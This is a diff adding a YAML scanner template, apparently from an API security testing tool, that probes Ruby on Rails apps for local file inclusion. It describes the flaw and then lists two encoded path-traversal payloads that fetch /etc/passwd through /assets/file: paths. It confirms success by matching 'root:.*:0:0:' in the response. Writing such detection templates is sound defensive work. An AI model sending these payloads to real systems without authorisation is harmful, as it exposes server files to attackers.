@@ -1,0 +1,56 @@
+id: RUBY_ON_RAILS_LFI
+info:
+  name: "Ruby On Rails Local File Inclusion"
+  description: "Ruby on Rails Local File Inclusion (LFI) is a security vulnerability that occurs when a Ruby on Rails application allows user input to dictate file paths without proper validation or sanitization. This can enable attackers to manipulate input and include local files from the server’s filesystem, potentially exposing sensitive data such as configuration files, environment variables, or logs. If exploited, this vulnerability can lead to information disclosure, unauthorized access, or further attacks on the application or underlying server. To mitigate this risk, developers should implement strict input validation and avoid accepting user-defined file paths."
+  details:  "Ruby on Rails Local File Inclusion (LFI) occurs when a Rails application accepts user input for file paths without adequate validation, allowing attackers to include arbitrary files from the server’s filesystem. By crafting malicious requests, attackers can gain access to sensitive files, such as configuration settings, secrets, or logs, which can lead to serious security breaches. This unauthorized access may expose critical information about the application and its environment, enabling attackers to exploit further vulnerabilities or escalate their privileges. To prevent LFI, developers should enforce strict whitelisting of file paths, implement robust input validation, and ensure proper error handling in file operations."
+  impact: "The impact of Ruby on Rails Local File Inclusion (LFI) can be significant, as it allows attackers to access sensitive files on the server, leading to potential information disclosure and security breaches. By exposing critical data such as configuration files, API keys, or user credentials, attackers can leverage this information to escalate privileges, launch further attacks, or compromise the entire application. Additionally, the breach of sensitive information can result in reputational damage, financial losses, and legal consequences for the organization. Furthermore, if attackers gain insights into the system's architecture, they may exploit other vulnerabilities, increasing the overall risk to the application’s security."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: RUBY_ON_RAILS_LFI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - '/assets/file:%2f%2f/etc/passwd'
+    - "/assets/file:%2f%2fapi/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "${paths}"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    regex: "root:.*:0:0:"
+strategy:
+  run_once: /
